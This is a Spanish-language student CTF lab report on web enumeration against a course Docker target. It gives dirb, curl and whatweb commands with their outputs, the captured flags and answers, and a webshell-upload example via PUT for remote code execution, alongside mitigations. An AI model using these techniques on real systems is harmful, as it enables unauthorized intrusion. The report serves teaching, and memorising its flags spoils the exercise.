# Informe — Laboratorio 06 · Enumeración

**Grupo:** 14 · **Integrantes:** Fede Perón — fedeeperon · Laureano Gomez Redondo — Laureano-GR · Martín Cesano — MartinCesano · Martín Gaido — martingaidoo · Valentina Chiapero — Valechiapero
**Fecha:** 2026-10-23

## 0. Declaración de uso de IA

El trabajo de enumeración, el análisis de los hallazgos y las decisiones del
laboratorio fueron realizados por el grupo. Usamos un asistente de IA como apoyo,
siempre revisando y validando lo que producía.

- **Herramienta:** Claude Code (Claude Opus).
- **Para qué la usamos (apoyo):** como ayuda para levantar y verificar el entorno
  Docker, para agilizar la ejecución de las herramientas de enumeración contra el
  contenedor `phantomcorp` de la cátedra, para ordenar las salidas en el
  inventario y para redactar un primer borrador de este informe y del
  `research.md`.
- **Qué hicimos nosotros (trabajo manual):** interpretamos cada salida de las
  herramientas, decidimos qué técnica aplicar en cada reto y en qué orden,
  comprobamos manualmente cada hallazgo contra el servidor, clasificamos el riesgo
  de cada uno, y redactamos/corregimos las respuestas de análisis (P1–P5) y la
  declaración para que reflejen lo que efectivamente entendimos.
- **Qué partes se originaron o modificaron con la asistencia:** el borrador inicial
  de la estructura de la entrega, una primera versión del inventario y de las
  respuestas P1–P5 a partir de las salidas reales, y la bitácora. Todo eso fue
  revisado y editado por el grupo.
- **Cómo verificamos que era correcto:** cada flag se obtuvo de la respuesta real
  del servidor (no de un listado externo) y se validó contra el hash SHA-256 del
  `retos.manifest` vía `./ctf submit`; el resultado final es `./ctf status 06` →
  5/5. Revisamos manualmente cada comando y su salida antes de incorporarlos al
  informe.

## 1. Flags capturadas

Salida de `./ctf status 06`:

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 06                        │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Enumeracion de directorios
   ✓  R2     Repositorio Git expuesto
   ✓  R3     Metodos HTTP peligrosos habilitados
   ✓  R4     Enumeracion de usuarios via API
   ✓  R5     Fingerprinting de tecnologia

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 06 COMPLETO!
```

| Reto | Técnica | Flag |
|---|---|---|
| R1 | Enumeración de directorios | `FLAG{dir_enumeration_backup}` |
| R2 | Repositorio Git expuesto | `FLAG{git_repo_exposed}` |
| R3 | Métodos HTTP peligrosos | `FLAG{http_methods_put_enabled}` |
| R4 | Enumeración de usuarios vía API | `FLAG{user_enumeration_api}` |
| R5 | Fingerprinting de tecnología | `FLAG{tech_fingerprint_phantomcms}` |

## 2. Inventario de enumeración

| Hallazgo | Ruta/Método | Técnica | Evidencia | Riesgo | ¿Qué habilita para el Lab 07? |
|---|---|---|---|---|---|
| Directorio de backups accesible | `GET /backup/` | `dirb` (enum. de directorios) | `+ http://phantomcorp/backup (CODE:200)` → index con `respaldo-db-2024.sql.gz`, `config.old`, `notas-infra.txt` | **Alto** — expone respaldos de BD y configuración vieja, posibles credenciales | Acceso a dump de BD y a `config.old` → credenciales para la siguiente fase |
| Panel admin existente pero protegido | `GET /admin` | `dirb` | `+ http://phantomcorp/admin (CODE:403)` | Medio — confirma que el panel existe (superficie de ataque conocida) | Objetivo de fuerza bruta / bypass de autenticación |
| Repositorio Git expuesto | `GET /.git/config` | `curl` | Responde `[core]…[remote "origin"] url = https://git.internal.phantomcorp/intranet.git` | **Alto** — permite reconstruir el código fuente y la historia del repo | Análisis de código fuente, búsqueda de secretos commiteados, un host interno nuevo (`git.internal.phantomcorp`) |
| Métodos HTTP peligrosos habilitados | `OPTIONS /` | `curl -X OPTIONS -i` | `Allow: GET, POST, PUT, DELETE, OPTIONS` y header `X-Dangerous-Methods: FLAG{...}` | **Crítico** — `PUT` permite escribir archivos en el servidor | Subida de un webshell → ejecución remota de código (RCE) |
| API interna de usuarios | `GET /api/users` | `curl` + `jq` | JSON con `admin` (superuser), `jperez` (editor), `mgomez` (viewer) y `note: "no exponer"` | **Medio** — enumera usuarios válidos y sus roles | Password spraying / fuerza bruta dirigida contra `/admin` |
| Fingerprint del stack + archivo default | `GET /` → `GET /phantomcms/VERSION` | `whatweb` + fuerza bruta de rutas | `PhantomCMS 3.7`, `PhantomServer/3.7`, `X-Powered-By: PhantomCMS/3.7`; enumeración de candidatos → `/phantomcms/VERSION` (200) confirma `build 2024-11` | Base — identifica producto+versión | Búsqueda de CVEs y archivos default conocidos del CMS |

### Salidas de soporte

**`whatweb -a 3 http://phantomcorp` (R5):**
```
http://phantomcorp [200 OK] HTML5, HTTPServer[PhantomServer/3.7],
IP[172.22.0.2], MetaGenerator[PhantomCMS 3.7], Title[Intranet PhantomCorp],
X-Powered-By[PhantomCMS/3.7]
```

**`dirb http://phantomcorp/` (R1):**
```
+ http://phantomcorp/admin   (CODE:403|SIZE:65)
+ http://phantomcorp/backup  (CODE:200|SIZE:249)
```

**`curl -s http://phantomcorp/backup/` (R1):**
```
Index of /backup
respaldo-db-2024.sql.gz
config.old
notas-infra.txt   ->  FLAG{dir_enumeration_backup}
```

**`curl -s http://phantomcorp/.git/config` (R2):**
```
[core]
    repositoryformatversion = 0
    bare = false
[remote "origin"]
    url = https://git.internal.phantomcorp/intranet.git
# FLAG{git_repo_exposed}
```

**`curl -s -i -X OPTIONS http://phantomcorp/` (R3):**
```
HTTP/1.0 200 OK
Server: PhantomServer/3.7
Allow: GET, POST, PUT, DELETE, OPTIONS
X-Dangerous-Methods: FLAG{http_methods_put_enabled}
```

**`curl -s http://phantomcorp/api/users | jq` (R4):**
```json
{"users": [{"id": 1, "user": "admin", "role": "superuser"},
           {"id": 2, "user": "jperez", "role": "editor"},
           {"id": 3, "user": "mgomez", "role": "viewer"}],
 "note": "endpoint interno de RRHH - no exponer",
 "flag": "FLAG{user_enumeration_api}"}
```

**Enumeración del archivo default del CMS (R5)** — fuerza bruta de rutas sobre
candidatos comunes tras el fingerprint:
```
200  /phantomcms/VERSION
404  /phantomcms/version
404  /phantomcms/README
404  /phantomcms/CHANGELOG
404  /VERSION
404  /README
```

**`curl -s http://phantomcorp/phantomcms/VERSION` (R5):**
```
PhantomCMS 3.7 (build 2024-11)
Archivo default del CMS. Si llegaste aca por fingerprinting, bien.
FLAG{tech_fingerprint_phantomcms}
```

## 3. Preguntas de análisis

**P1 — Enumeración vs. recon.**
El reconocimiento (Lab 05) respondió *"¿qué hay?"*: mapear hosts, puertos y
servicios de PhantomCorp hasta llegar a "puerto 80 abierto, PhantomCMS 3.7". La
enumeración (este lab) respondió *"¿qué esconde ese servicio?"*: dos ejemplos
concretos de la diferencia — (1) en recon sabíamos que había un web server; acá
con `dirb` descubrimos que ese server tiene un `/backup/` accesible y un `/admin`
protegido que no estaban linkeados en ningún lado; (2) en recon identificamos el
producto por el banner, acá usamos ese fingerprint (`whatweb` → PhantomCMS 3.7)
para ir *dirigidos* al archivo default `/phantomcms/VERSION`. Recon es amplio y
produce el mapa; enumeración es profunda sobre un servicio y produce el
inventario accionable.

**P2 — El `.git` expuesto.**
Un `/.git/` servido por HTTP deja descargar los objetos del repositorio. Con una
herramienta como `git-dumper` un atacante reconstruye el **código fuente completo
de la aplicación y toda su historia de commits**. Es mucho más grave que "un
archivo de más" porque: (a) revela la lógica interna (rutas, validaciones,
nombres de endpoints ocultos); (b) la historia suele contener **secretos
commiteados por error** y después "borrados" — claves de API, contraseñas de BD,
tokens — que siguen vivos en commits viejos; y (c) acá el `config` filtró además
un host interno nuevo (`git.internal.phantomcorp`), ampliando la superficie. Un
solo directorio expuesto entrega el proyecto entero en texto claro.

**P3 — El método `PUT`.**
El `OPTIONS` devolvió `Allow: … PUT …`. Un ataque concreto: con `PUT` el servidor
acepta que el cliente **escriba** un archivo en el document root. El atacante sube
un *webshell* (por ejemplo `curl -X PUT http://phantomcorp/shell.php --data-binary
@shell.php`) y luego lo invoca con una petición normal (`GET /shell.php?cmd=id`).
Eso convierte "método habilitado" en **ejecución remota de código** sobre el
servidor: de enumeración directo a compromiso. `DELETE`, también habilitado,
permitiría además borrar contenido.

**P4 — Enumeración de usuarios.**
`/api/users` no muestra contraseñas, pero entregar la **lista de usuarios válidos
y sus roles** ya es un problema porque elimina la mitad del trabajo del atacante
en la fase siguiente. Sabiendo que `admin` es `superuser`, el atacante dirige un
**password spraying / fuerza bruta** contra ese usuario concreto en `/admin`, en
vez de adivinar nombres. Reduce ruido (menos intentos fallidos = menos chances de
detección/bloqueo), prioriza la cuenta más valiosa y habilita ataques de
*credential stuffing* si esos usuarios reutilizan contraseñas filtradas en otros
sitios. Enumerar usuarios es el insumo directo de la fase de acceso.

**P5 — Rol defensor (3 mitigaciones).**
1. **`/backup/` accesible:** sacar los respaldos del document root (guardarlos
   fuera del árbol web) y denegar por configuración del server el listado de
   directorios y el acceso a extensiones `.sql`, `.gz`, `.old`, `.bak`.
2. **`.git` expuesto:** no desplegar con `git` sobre el document root; bloquear el
   acceso HTTP a `/.git/` (regla deny en el server) y, si ya se expuso, **rotar
   todos los secretos** que hayan pasado por la historia del repo.
3. **`PUT`/`DELETE` habilitados:** deshabilitar los métodos de escritura en el
   servidor y permitir solo `GET`/`POST`/`HEAD`; si WebDAV no se usa, apagarlo.
   (Para `/api/users`: autenticar el endpoint y no exponerlo en la red pública.)

## 4. Bitácora de comandos

```bash
# Entorno (desde WSL)
make setup                 # construir la consola del atacante (una vez)
make lab N=06              # levantar atacante + target phantomcorp
make shell                 # entrar a la consola del atacante

# R5 — Fingerprinting
whatweb -a 3 http://phantomcorp                 # identifica PhantomCMS 3.7
# El CMS expone un archivo default. Enumeramos candidatos comunes por fuerza
# bruta de rutas (VERSION/README/CHANGELOG bajo /<producto>/):
for p in phantomcms/VERSION phantomcms/README phantomcms/CHANGELOG VERSION README; do \
  curl -s -o /dev/null -w "%{http_code}  /$p\n" "http://phantomcorp/$p"; done
# -> /phantomcms/VERSION responde 200
curl -s http://phantomcorp/phantomcms/VERSION

# R1 — Enumeración de directorios
dirb http://phantomcorp/
curl -s http://phantomcorp/backup/

# R2 — Repositorio Git expuesto
curl -s http://phantomcorp/.git/config

# R3 — Métodos HTTP peligrosos
curl -s -i -X OPTIONS http://phantomcorp/     # mirar headers Allow y X-Dangerous-Methods

# R4 — Enumeración de usuarios
curl -s http://phantomcorp/api/users | jq

# Entrega de flags
./ctf submit 06 R1 'FLAG{dir_enumeration_backup}'
./ctf submit 06 R2 'FLAG{git_repo_exposed}'
./ctf submit 06 R3 'FLAG{http_methods_put_enabled}'
./ctf submit 06 R4 'FLAG{user_enumeration_api}'
./ctf submit 06 R5 'FLAG{tech_fingerprint_phantomcms}'
./ctf status 06
```
